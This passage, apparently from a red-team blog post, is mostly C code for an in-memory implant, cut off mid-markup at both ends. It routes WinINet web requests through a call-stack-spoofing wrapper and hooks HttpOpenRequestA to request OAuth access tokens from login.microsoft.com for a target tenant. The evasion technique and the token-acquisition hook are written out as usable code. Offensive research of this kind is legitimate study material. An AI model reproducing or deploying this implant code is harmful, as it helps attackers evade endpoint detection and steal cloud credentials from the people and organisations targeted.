&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( (DWORD_PTR)NULL ) ) );

&nbsp;&nbsp;&nbsp;&nbsp;if (hSite)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Create http request&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR acceptTypes[] = { C_PTR ( OFFSET ( "*/*" ) ), NULL };
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HINTERNET hReq = ( HINTERNET )SPOOF( pMemAddrs-&gt;Api.net.HttpOpenRequestA,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hSite,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verb,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;acceptTypes,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE ) ),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (hReq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Set headers + content length values
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD headersLen = 0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD contentLen = 0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (headers != NULL)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headersLen = (DWORD)pMemAddrs-&gt;Api.msvcrt.strlen(headers);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (content != NULL)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;contentLen = (DWORD)pMemAddrs-&gt;Api.msvcrt.strlen(content);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Send http request using specified headers and content
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((BOOL) U_PTR ( SPOOF( pMemAddrs-&gt;Api.net.HttpSendRequest,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( hReq ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( U_PTR( headersLen ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;content,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( U_PTR ( contentLen ) ) )&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;) == TRUE)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Allocate a buffer to receive response from server
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// This should really be allocated dynamically, but 5K is enough for the requests we are making.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpResult = pMemAddrs-&gt;Api.msvcrt.calloc(5000, sizeof(char));

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Call InternetReadFile in a loop until we have read everything.&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwBytesRead = 0, currbytes_read;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOL bKeepReading = TRUE;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bKeepReading = (BOOL) U_PTR ( SPOOF( pMemAddrs-&gt;Api.net.InternetReadFile,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( hReq ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( lpResult + dwBytesRead ),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( U_PTR ( 5000 - dwBytesRead ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( U_PTR ( &amp;currbytes_read ) ) ) );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwBytesRead += currbytes_read;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} while (bKeepReading &amp;&amp; currbytes_read);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Close handle to request
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SPOOF( pMemAddrs-&gt;Api.net.InternetCloseHandle,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hReq );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Close handle to site
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SPOOF( pMemAddrs-&gt;Api.net.InternetCloseHandle,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hSite);
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;return lpResult;
};</pre>
</div>
</div>
</div>
<p>In the <span id="3868bd19-5dfe-4d0a-bf86-a2e1410a149e" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="3868bd19-5dfe-4d0a-bf86-a2e1410a149e">HttpOpenRequestA_Hook</span> function I assembled the headers and content that access token requests require, and then called ‘MakeWebRequest’:</p>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">code data-language=</span><span class="enlighter-s0">"none"</span><span class="enlighter-g1">&gt;</span><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-m0">HttpOpenRequestA_Hook</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszVerb, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszObjectName, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszVersion, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszReferrer, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR *lplpszAcceptTypes,</span></div></div><div class=""><div><span class="enlighter-text">                                               DWORD dwFlags, DWORD_PTR dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HINTERNET       hResult = INVALID_HANDLE_VALUE;</span></div></div><div class=""><div><span class="enlighter-text">    LARGE_INTEGER   currentTime, frequency;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           verb, uri, tempUri, headers, content, response;</span></div></div><div class=""><div><span class="enlighter-text">    size_t          reqSize;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">int</span><span class="enlighter-text">             elapsedTime;</span></div></div><div class=""><div><span class="enlighter-text">    CHAR            size</span><span class="enlighter-g1">[</span><span class="enlighter-text">10</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = </span><span class="enlighter-g1">{</span><span class="enlighter-text">0</span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    CHAR            id</span><span class="enlighter-g1">[</span><span class="enlighter-text">100</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = </span><span class="enlighter-g1">{</span><span class="enlighter-text">0</span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// ------------------------------------ Get Access Token ---------------------------------------</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Define headers to be used</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            headers = </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Host: login.microsoft.com\r\nContent-Type: application/x-www-form-urlencoded"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Allocate and assemble uri</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            reqSize = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">TENANT_ID</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"//oauth2/v2.0/token"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 1;</span></div></div><div class=""><div><span class="enlighter-text">            tempUri = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">reqSize, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">sprintf</span><span class="enlighter-g1">(</span><span class="enlighter-text">tempUri, </span><span 